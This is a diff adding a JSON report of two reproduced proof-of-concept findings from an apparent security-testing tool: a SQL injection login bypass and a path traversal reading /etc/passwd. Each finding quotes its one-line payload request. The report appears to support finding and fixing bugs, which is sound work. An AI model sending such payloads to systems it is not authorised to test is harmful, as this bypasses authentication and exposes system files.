@@ -1,0 +1,27 @@
+{
+  "tool": "poc",
+  "generated": [
+    {
+      "id": "poc-1",
+      "cwe": "CWE-89",
+      "component": "api/auth/login.py:42",
+      "title": "SQL injection proof-of-concept against login endpoint",
+      "severity": "high",
+      "reproduced": true,
+      "script": "poc_sqli_login.py",
+      "proof": "POST /login  body: username=admin'-- -&password=x",
+      "observed": "authentication bypassed - session established as 'admin' without a valid password"
+    },
+    {
+      "id": "poc-2",
+      "cwe": "CWE-22",
+      "component": "web/download.py:63",
+      "title": "Path traversal proof-of-concept on file download",
+      "severity": "medium",
+      "reproduced": true,
+      "script": "poc_traversal_download.py",
+      "proof": "GET /download?file=../../../../etc/passwd",
+      "observed": "responded 200 with contents of /etc/passwd outside the intended directory"
+    }
+  ]
+}
